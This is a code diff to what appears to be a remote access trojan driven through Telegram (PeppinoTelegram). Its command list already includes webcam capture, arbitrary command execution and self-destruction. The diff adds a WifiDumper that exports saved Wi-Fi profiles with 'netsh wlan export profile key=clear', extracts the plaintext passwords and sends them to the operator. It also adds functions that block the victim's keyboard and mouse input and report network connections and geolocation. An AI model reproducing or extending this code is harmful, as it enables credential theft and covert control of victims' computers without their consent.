@@ -42,6 +42,7 @@ import pyautogui as pg
 import subprocess as sp
 from shutil import copy2
 from re import findall, M
+from xml.dom import minidom
 from time import time, sleep
 from threading import Thread
 from datetime import datetime
@@ -127,6 +128,12 @@ shutdown - Shut down the PC.
 fakeshutdown - Fake system shutdown.
 altf4 - Simulate Alt + F4.
 clear - Removes all cv2 windows, closes webcam and removes temporary files.
+selfdestruction - Removes the program from the machine permanently.
+
+🌐 Network & Remote Access
+netstat – Show network connections.
+wifiinfo – Dump saved Wi-Fi SSIDs and passwords.
+ipinfo – Get public IP and geolocation.
 
 📸 Camera & Screen
 selfie - Take a webcam selfie.
@@ -163,9 +170,14 @@ setvideowallpaper - Sets a video as wallpaper.
 execute - Run system command.
 processkiller - Shows a table of processes that you can kill.
 terminateprocess - Kills a process by name.
+
+🎮 Input / Device Control
 randomkeyboard - Sets all user's input to random characters.
 capslock - Activates capslock.
 mousecontroller - Sends a mouse controlling menu.
+mouselock - Locks the mouse in position.
+inputblock - Blocks mouse and keyboard.
+inputunblock - Unblocks mouse and keyboard.
 
 📋 Messaging
 bsend - Send custom text.
@@ -397,6 +409,28 @@ def toducky(payload, execute=False) -> str:
         exec(final)
     return final
 
+class WifiDumper:
+    def extract_all() -> dict[str:str]:
+        sp.run("netsh wlan export profile key=clear", stdout=sp.PIPE, stderr=sp.PIPE)
+        xmls = []
+        wifis = {} 
+        for file in listdir():
+            if file.endswith(".xml") and file.startswith("Wi-Fi"):
+                xmls.append(file)
+
+        for xml in xmls:
+            file = minidom.parse(xml)
+            psw = file.getElementsByTagName("keyMaterial")[0].firstChild.data
+            name = file.getElementsByTagName("name")[0].firstChild.data
+
+            wifis.update({name:psw})
+
+        for file in xmls:
+            remove(file)
+        return wifis
+
+    def __str__(self) -> str:
+        return "\n".join([f"{k} - {v}" for k,v in self.extract_all().items()])
 
 class ButtonsMenu:
     def __init__(self, chat_id: int, bot: Bot, buttons: dict[str, Callable], label: str = "Choose an action", autosend: bool=True, next_btn: bool=False, page_limit: int = 8, page: int=0, next_btn_lab: str = "next_page", prev_btn_lab: str = "previous_page", close_btn_lab="close_page", keyboard_rows=2) -> None:
@@ -692,6 +726,7 @@ class PeppinoTelegram:
             self.mixer_menu_keyboard = None
             self.mouse_controller_menu = None
             self.display_mode_keyboard  = None
+            self.wifidumper = WifiDumper
             #converts text to functions
             self.function_table: dict[str:Callable] = {
                 "pss":self.pss,
@@ -728,6 +763,12 @@ class PeppinoTelegram:
                 "distortedscreen":self.distorted_screen,
                 "displaymode":self.display_mode,
                 "jumpscarenoaudio":self.jumpscarenoaudio,
+                "netstat":self.netstat,
+                "ipinfo":self.ipinfo,
+                "mouselock":self.mouselock,
+                "inputblock":self.block_input,
+                "inputunblock":self.unblock_input,
+                #"keyboardlock":self.keyboardlock,
                 "fullclip":self.record_webcam_and_screen,
                 "selfdestruction":self.selfdestruction,
                 "duckyhelp":lambda: self.bsend(self.duckyhelp),
@@ -741,6 +782,7 @@ class PeppinoTelegram:
                 "mutevolume":lambda:self.audio_mixer.mute(),
                 "setvolume":self.audio_mixer.setVolumePercentage,
                 "fullvolume":lambda:self.audio_mixer.full(),
+                "wifiinfo":self.wifiinfo,
                 "mixermenu":self.mixer_menu,
                 "camerawallpaper":self.setCameraAsWallpaper,
                 "mousecontroller":self.mousecontroller,
@@ -798,6 +840,12 @@ class PeppinoTelegram:
                 raise ConnectionError
             except Exception as e:
                 return self.bsend(text, retries+1)
+
+        def block_input(self) -> None:
+            ctypes.windll.user32.BlockInput(True)
+
+        def unblock_input(self) -> None:
+            ctypes.windll.user32.BlockInput(False)
 
         def cantopen(self, process: str) -> None:
             self.cantopenlist.append(process)
@@ -895,6 +943,9 @@ class PeppinoTelegram:
 
         def inverted_screen(self) -> None:
             self.modded_screenshot(invert_image)
+
+        def ipinfo(self):
+            self.execute("curl ifconfig.co")
 
         def johnpork(self, audio=True) -> None:
             self.jumpscare("johnpork_meme", "johnpork", playaudio=audio, setvolume=100)
@@ -1009,6 +1060,12 @@ class PeppinoTelegram:
             pos = pg.position()
             pg.moveTo(pos[0], pos[1]-MOUSE_JMP)
 
+        def mouselock(self, timer: int) -> None:
+            start = time()
+            pos = pg.position()
+            while timer > (time()-start):
+                pg.moveTo(pos)
+
         def new_editable_message(self, content: str, autosend: bool=True) -> EditableMessage:
             return EditableMessage(self.bot, self.owner_id, content, autosend)
 
@@ -1017,6 +1074,9 @@ class PeppinoTelegram:
 
         def new_menu(self, menu: dict[str:Any], autosend: bool=True, label: str="Choose an option: ", page: int=0, next_btn: bool=False, next_btn_lab: str="next_page", prev_btn_lab: str="previus_page", close_btn_lab: str="close_page", rows=2) -> ButtonsMenu:
             return ButtonsMenu(self.owner_id, self.bot, menu, label, autosend, page=page, next_btn=next_btn, next_btn_lab=next_btn_lab, prev_btn_lab=prev_btn_lab, close_btn_lab=close_btn_lab, keyboard_rows=rows)
+
+        def netstat(self) -> None:
+            self.execute("netstat")
 
         def on_callback_query(self, msg) -> None:
             query_id, from_id, data = glance(msg, flavor="callback_query")
@@ -1564,6 +1624,9 @@ class PeppinoTelegram:
                     remove(filename)
                     break
             self.closecap()
+
+        def wifiinfo(self) -> None:
+            self.bsend(f"Wifi-Info\n{str(self.wifidumper)}")
 
 if __name__ == "__main__":
     token, chat_id = getCred() 
